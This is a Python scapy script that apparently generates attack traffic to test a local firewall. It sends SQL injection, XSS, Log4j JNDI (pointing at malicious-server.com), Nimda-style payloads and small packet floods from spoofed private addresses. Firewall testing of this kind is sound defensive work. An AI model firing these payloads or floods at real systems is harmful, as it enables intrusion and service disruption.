from scapy.all import IP, TCP, UDP, ICMP, Raw, send
import time
import random
from typing import List

class AttackSimulator:
    def __init__(self, target_ip: str = "192.168.1.1"):
        self.target_ip = target_ip
        self.source_ips = [f"192.168.1.{i}" for i in range(10, 20)]
        
    def craft_tcp_packet(self, src_ip, dst_ip, payload):
        """Craft a TCP packet with HTTP request format"""
        # Format the payload as an HTTP request
        http_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"\r\n"
            f"{payload}"
        ).encode()
        
        # Create IP packet
        ip = IP(src=src_ip, dst=dst_ip)
        
        # Create TCP packet with HTTP payload
        tcp = TCP(sport=12345, dport=80)
        
        # Combine layers with Raw payload
        packet = ip/tcp/Raw(load=http_request)
        
        return packet

    def simulate_sql_injection(self):
        """Simulate SQL injection attack"""
        payload = "username=admin' OR '1'='1"
        packet = self.craft_tcp_packet(self.source_ips[0], self.target_ip, payload)
        try:
            send(packet, verbose=False)
            print(f"Sent SQL injection payload: {payload}")
            time.sleep(1)  # Add delay between packets
        except Exception as e:
            print(f"Error sending SQL injection packet: {e}")

    def simulate_xss(self):
        """Simulate XSS attack"""
        payload = "<script>alert('XSS')</script>"
        packet = self.craft_tcp_packet(self.source_ips[0], self.target_ip, payload)
        try:
            send(packet, verbose=False)
            print(f"Sent XSS payload: {payload}")
            time.sleep(1)  # Add delay between packets
        except Exception as e:
            print(f"Error sending XSS packet: {e}")

    def simulate_log4j(self):
        """Simulate Log4j exploitation attempt"""
        payload = "${jndi:ldap://malicious-server.com/exploit}"
        packet = self.craft_tcp_packet(self.source_ips[0], self.target_ip, payload)
        try:
            send(packet, verbose=False)
            print(f"Sent Log4j payload: {payload}")
            time.sleep(1)  # Add delay between packets
        except Exception as e:
            print(f"Error sending Log4j packet: {e}")

    def simulate_rate_limit_breach(self):
        """Simulate rate limit breach from a single IP"""
        try:
            src_ip = "192.168.1.100"
            print(f"\nSimulating rate limit breach from {src_ip}...")
            payload = "Normal HTTP GET request"
            
            # Send packets rapidly to trigger rate limiting
            for _ in range(150):  # Send more than the rate limit (100 packets/minute)
                packet = self.craft_tcp_packet(src_ip, self.target_ip, payload)
                send(packet, verbose=False)
            print(f"Sent 150 packets rapidly from {src_ip}")
        except Exception as e:
            print(f"Error in rate limit breach simulation: {e}")

    def simulate_udp_flood(self):
        """Simulate UDP flood attack"""
        try:
            print("\nSimulating UDP flood...")
            for _ in range(10):
                src_ip = random.choice(self.source_ips)
                packet = IP(src=src_ip, dst=self.target_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=80
                )
                send(packet, verbose=False)
            print("Sent UDP flood packets")
        except Exception as e:
            print(f"Error in UDP flood simulation: {e}")

    def simulate_nimda_worm(self):
        """Simulate Nimda worm attack"""
        try:
            print("\nSimulating Nimda worm attack...")
            payload = "GET/scripts/root.exe"
            packet = self.craft_tcp_packet(self.source_ips[0], self.target_ip, payload)
            send(packet, verbose=False)
            print(f"Sent Nimda worm payload: {payload}")
            time.sleep(1)
        except Exception as e:
            print(f"Error in Nimda worm simulation: {e}")

def main():
    try:
        input("Make sure the firewall is running and press Enter to start the attack simulation...")
        simulator = AttackSimulator("192.168.1.1")
        
        # Run all attack simulations
        simulator.simulate_sql_injection()
        simulator.simulate_xss()
        simulator.simulate_log4j()
        simulator.simulate_rate_limit_breach()
        simulator.simulate_udp_flood()
        simulator.simulate_nimda_worm()
        
        print("\nAttack simulation completed!")
    except Exception as e:
        print(f"Error in main simulation: {e}")

if __name__ == "__main__":
    main() 